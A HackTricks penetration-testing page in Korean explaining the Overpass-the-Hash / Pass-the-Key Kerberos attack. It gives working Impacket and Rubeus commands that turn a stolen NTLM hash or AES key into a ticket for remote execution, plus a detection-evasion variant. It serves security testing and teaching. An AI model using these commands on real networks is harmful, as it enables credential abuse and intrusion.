# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** 공격은 전통적인 NTLM 프로토콜이 제한되고 Kerberos 인증이 우선시되는 환경을 위해 설계되었습니다. 이 공격은 사용자의 NTLM 해시 또는 AES 키를 활용하여 Kerberos 티켓을 요청함으로써 네트워크 내의 리소스에 대한 무단 접근을 가능하게 합니다.

이 공격을 실행하기 위한 첫 번째 단계는 대상 사용자의 계정에 대한 NTLM 해시 또는 비밀번호를 획득하는 것입니다. 이 정보를 확보한 후, 해당 계정에 대한 티켓 부여 티켓(TGT)을 얻을 수 있으며, 이를 통해 공격자는 사용자가 권한을 가진 서비스나 머신에 접근할 수 있습니다.

이 프로세스는 다음 명령어로 시작할 수 있습니다:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256이 필요한 시나리오에서는 `-aesKey [AES key]` 옵션을 사용할 수 있습니다. 또한, 획득한 티켓은 smbexec.py 또는 wmiexec.py와 같은 다양한 도구와 함께 사용될 수 있어 공격의 범위를 넓힙니다.

_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 문제는 일반적으로 Impacket 라이브러리를 업데이트하거나 IP 주소 대신 호스트 이름을 사용하여 해결되며, Kerberos KDC와의 호환성을 보장합니다.

Rubeus.exe를 사용하는 대체 명령 시퀀스는 이 기술의 또 다른 측면을 보여줍니다:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
이 방법은 **Pass the Key** 접근 방식을 반영하며, 인증 목적으로 티켓을 직접 장악하고 활용하는 데 중점을 둡니다. TGT 요청의 시작은 이벤트 `4768: A Kerberos authentication ticket (TGT) was requested`를 트리거하며, 이는 기본적으로 RC4-HMAC 사용을 나타내지만, 최신 Windows 시스템은 AES256을 선호합니다.

운영 보안에 부합하고 AES256을 사용하기 위해 다음 명령을 적용할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 참고문헌

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)


{{#include ../../banners/hacktricks-training.md}}
